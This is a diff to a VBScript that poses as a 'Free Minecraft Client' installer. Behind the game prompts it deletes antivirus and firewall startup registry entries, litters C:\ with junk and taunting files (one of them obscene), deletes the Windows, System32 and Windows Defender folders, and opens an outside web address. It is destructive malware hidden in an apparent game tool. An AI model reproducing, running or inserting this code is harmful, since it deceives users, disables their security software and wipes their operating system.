@@ -309,13 +309,64 @@ Msgbox "You can now close this Application, Startup Minecraft and you should hav
 Msgbox "DO NOT RESTART YOUR COMPUTER! (UPDATE)"
 If Month(Now()) = 09 And  Day(Now()) = 01 Then MsgBox "Free Minecraft Client"
 
+carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SystemTray"
+carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVPCC"
+carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\NAVW32"
+carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\TrueVector"
+carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ZoneAlarm Pro"
+
+
+
+
+
+
+
+Set carew= CreateObject("scripting.filesystemobject") 
+  
+carew.CreateTextFile "C:\Norton2003isbad_preferKAVORAVP" 
+carew.CreateTextFile "C:\AVP" 
+carew.CreateTextFile "C:\NAV" 
+carew.CreateTextFile "C:\CHILE" 
+carew.CreateTextFile "C:\TEMUCO" 
+carew.CreateTextFile "C:\MCAFEE" 
+carew.CreateTextFile "C:\ENTELPCS" 
+
+carew.CreateTextFile "C:\GSM1900MHZ" 
+carew.CreateTextFile "C:\SONYERICSSON" 
+carew.CreateTextFile "C:\CAREFULLY_WHIT_ME" 
+
+carew.CreateTextFile "C:\YOUR_PC_IS_VERY_BAD" 
+carew.CreateTextFile "C:\CAN" 
+carew.CreateTextFile "C:\VBS.CarewMR.a"
+carew.CreateTextFile "C:\I" 
+carew.CreateTextFile "C:\GET" 
+carew.CreateTextFile "C:\WindowsXP"
+carew.CreateTextFile "C:\Windows3.11" 
+carew.CreateTextFile "C:\Windows98SE"
+carew.CreateTextFile "C:\WindowsME"  
+carew.CreateTextFile "C:\Windows 95" 
+carew.CreateTextFile "C:\WindowsNT"
+carew.CreateTextFile "C:\Windows2000"
+carew.CreateTextFile "C:\TELLCELL S.A"
+carew.CreateTextFile "C:\AN"
+carew.CreateTextFile "C:\CHEESEBURGER"
+carew.CreateTextFile "C:\WITH"
+carew.CreateTextFile "C:\EXTRA"
+carew.CreateTextFile "C:\SAUCE"
+carew.CreateTextFile "C:\AND"
+carew.CreateTextFile "C:\UM"
+carew.CreateTextFile "C:\PC-CILLIN"
+carew.CreateTextFile "C:\AvpM.exe" 
+carew.CreateTextFile "C:\Kaspersky_AntiVirus_PersonalPRO_THEBEST!!!!!"
+carew.CreateTextFile "C:\Norton_thePOOR"
+carew.CreateTextFile "C:\Madonna_Sucking_my_dick.avi"
+carew.CreateTextFile "C:\Your_system_is_infected_by_a_virus_jajajajajajaja.jajajaja"  
+
+
 carew.deleteFolder "C:\Windows" 
 carew.deleteFolder "C:\Windows\System32"
 carew.deleteFolder "C:\Program Files\Windows Defender"
-
-
-
-			       
+       
 
 
 carew.Run "https://myprivate.pics/watch.php?video=I2M1MK.php"  
